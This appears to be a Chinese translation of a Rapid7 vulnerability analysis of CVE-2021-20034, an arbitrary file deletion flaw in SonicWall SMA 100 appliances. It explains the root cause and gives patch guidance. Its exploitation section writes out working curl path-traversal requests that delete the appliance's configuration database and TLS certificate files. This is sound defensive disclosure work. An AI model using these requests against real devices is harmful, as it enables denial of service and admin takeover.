技术分析

描述

2021 年 9 月 23 日，SonicWall 发布了CVE-2021-20034 的公告，这是一个影响其安全移动访问 (SMA) 100 系列的关键任意文件删除漏洞。

该漏洞是将攻击者控制的文件路径传递到unlink函数的结果。成功的利用将允许攻击者将管理员密码重置为其默认值等。CVE-2021-20034 的 CVSSv3 基础分数为 9.1。


在撰写本文时，此问题不存在公开漏洞利用，也没有公开情报表明该漏洞正在被广泛利用。


受影响的产品

运行以下版本的 SonicWall SMA 100 系列平台（SMA 200、SMA 210、SMA 400、SMA 410 和 SMA 500v）：

  • 9.0.0.10-28sv 及更早版本

  • 10.2.0.7-34sv 及更早版本

  • 10.2.1.0-17sv 及更早版本


Rapid7 分析

根本原因

该漏洞的代码可以位于内/usr/src/EasyAccess/www/cgi-bin/handleWAFRedirect并且可以通过网络在到达https://address/cgi-bin/handleWAFRedirect。具体问题与使用unlink攻击者控制的文件路径有关。下面展示了 Ghidra 对受影响的unlink.

在上图中，传递到的文件路径unlink是通过使用/tmp/%s攻击者数据和 snprintf. 虽然这看起来像是一个明显的路径遍历问题，但之前在函数中检查了用户提供的路径是否存在路径遍历。

在上面的代码中，攻击者提供的文件名再次组合，/tmp/%s然后isPathStartFromDir像这样传递给： isPathStartFromDir(‘/tmp/user_provided’, ‘/tmp\x00’)。isPathStartFromDir其实就是写得合理的目录遍历检查函数。它使用realpath来解析攻击者控制的文件路径，然后确定该路径是否仍在/tmp：

这部分handleWAFRedirect将识别攻击者提供的路径遍历并适当地拒绝让逻辑流向fopen调用。但是，不是在确定用户提供的路径无效后立即退出，而是handleWAFRedirect继续下降到上述unlink逻辑。因此，虽然 SonicWall 将此问题描述为“路径遍历检查”绕过，但它实际上只是一个直接的逻辑错误。该软件将路径识别为可疑，但无论如何都错误地使用了它。


为了解决这个问题，SonicWall（或多或少）添加了在isPathStartFromDir失败后退出的逻辑。

开发

攻击者只拥有“nobody”用户的权限。这实际上是非常有限的，因为大多数一切都以 root 身份运行，并且大多数文件需要 root 权限才能修改它们。但是，攻击者可以追踪一些非常重要的配置文件。

攻击者可以删除的最重要的文件是persist.db. 它包含各种系统的配置设置。从用户和密码到门户自定义和域，persist.db 在引导和固件升级之间维护所有这些信息。

那么当攻击者删除persist.db 时会发生什么？

albinolobster@ubuntu:~$ curl -v --insecure "https://10.0.0.6/cgi-bin/handleWAFRedirect?hdl=../flash/etc/EasyAccess/var/conf/persist.db"*   Trying 10.0.0.6:443...* Connected to 10.0.0.6 (10.0.0.6) port 443 (#0)> GET /cgi-bin/handleWAFRedirect?hdl=../flash/etc/EasyAccess/var/conf/persist.db HTTP/1.1> Host: 10.0.0.6> User-Agent: curl/7.74.0> Accept: */*>< HTTP/1.1 200 OK< Date: Tue, 12 Oct 2021 19:15:17 GMT< Server: SonicWALL SSL-VPN Web Server< X-FRAME-OPTIONS: SAMEORIGIN< X-XSS-Protection: 1; mode=block< Content-Security-Policy: script-src https://*.duosecurity.com 'self' 'unsafe-inline' 'unsafe-eval'; object-src 'self'; style-src 'self' 'unsafe-inline'< Referrer-Policy: strict-origin< X-Content-Type-Options: nosniff< Transfer-Encoding: chunked< Content-Type: text/html; charset=UTF-8<...

响应是正常的 200 OK，但 Web 界面变得完全不可用。

这是有道理的，因为即使只是点击登录页面也需要 Web 界面访问persist.db。如果缺少persist.db，HTTP 服务器就会陷入错误状态。但重要的是系统不会重新启动。系统只是在糟糕的状态下闲置。


重新启动时会生成默认的 persist.db。这意味着创建了具有默认密码 ( password)的管理员帐户。这将允许攻击者访问 Web 界面，但攻击者似乎没有任何强制重启的方法。


攻击者还可以强制系统无限重启。这可以通过删除默认 SSL 证书来实现。

albinolobster@ubuntu:~$ curl -v --insecure "https://10.0.0.6/cgi-bin/handleWAFRedirect?hdl=../usr/src/EasyAccess/var/cert/server.crt"
albinolobster@ubuntu:~$ curl -v --insecure "https://10.0.0.6/cgi-bin/handleWAFRedirect?hdl=../usr/src/EasyAccess/var/cert/server.key"

系统重新启动时，httpd将因缺少证书而无法启动。这将触发软件监视器重新启动。

同样，进入重启周期需要有人首先重启服务器。这是此漏洞有用性的主要限制因素。当然，CVE-2021-20034 是危险的，可以被破坏性攻击者利用，只是看起来很混乱。但是，如果没有易于使用的重启机制，攻击者将难以利用该漏洞来像我们在之前的 SonicWall 漏洞中看到的那样进入企业网络。


指导

所有受影响版本的补丁都已发布，因此 SMA 100 系列客户应遵循SonicWall 的补丁指南。尽可能避免将 Web 界面暴露给公共互联网。SonicWall 客户还可以导出httpd日志（系统 –> 诊断 –> 下载报告 –> httpd.log）并查找尝试利用。示例日志条目：
